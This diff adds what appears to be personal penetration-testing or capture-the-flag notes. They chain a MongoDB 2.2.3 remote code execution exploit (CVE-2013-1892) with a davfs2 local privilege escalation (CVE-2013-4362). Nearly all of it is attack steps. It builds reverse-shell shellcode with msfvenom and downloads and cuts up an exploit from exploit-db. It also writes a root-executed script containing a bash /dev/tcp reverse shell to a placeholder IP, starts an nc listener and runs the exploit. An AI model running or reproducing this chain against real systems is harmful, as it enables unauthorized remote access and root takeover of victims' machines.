@@ -1,0 +1,42 @@
+MongoDB 2.2.3 - nativeHelper.apply Remote Code Execution CVE-2013-1892
+
+https://www.exploit-db.com/exploits/24947
+
+shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f js_le
+
+su davtest 
+password: davtest
+
+privesc:
+
+davfs2 1.4.6/1.4.7 - Local Privilege Escalation CVE-2013-4362 
+
+set dav passwd for davtest in passwd.dav
+
+htpasswd /var/www/web1/passwd.dav davtest
+
+grep davfs /etc/fstab 
+http://127.0.0.1/webdav/   /home/davtest/dav   davfs   noauto,rw,users   0   0
+
+cd /home/davtest
+wget --no-check-certificate https://www.exploit-db.com/download/28806 -O 28806.temp.txt
+tr -d '\r' < 28806.temp.txt > 28806.txt
+sed -n '40,73p' 28806.txt > coda.c
+sed -n '84,90p' 28806.txt > Makefile
+sed -n '101,192p' 28806.txt > exploit.sh
+echo '#!/usr/bin/env bash' > /home/davtest/rootprog
+echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /home/davtest/rootprog
+chmod +x /home/davtest/rootprog
+chmod +x exploit.sh
+echo 'kernel_fs       coda' >> .davfs2/davfs2.conf
+
+nc -lnvp 4444
+
+./exploit.sh
+
+"Specify the full path of the kernel module" - enter
+
+"Specify the user-mode ELF which you whish to copy in /tmp/rootprog":
+/home/davtest/rootprog
+
+mount /home/davtest/dav
